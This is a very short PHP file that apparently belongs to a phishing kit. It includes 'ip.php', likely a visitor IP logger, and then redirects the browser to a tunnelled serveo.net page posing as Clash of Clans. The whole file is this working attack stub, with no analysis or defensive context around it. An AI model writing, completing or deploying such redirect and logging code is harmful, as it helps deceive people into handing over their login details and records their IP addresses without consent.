<?php
include 'ip.php';
header('Location: https://clashofclans.serveo.net/index.html');
exit
?>
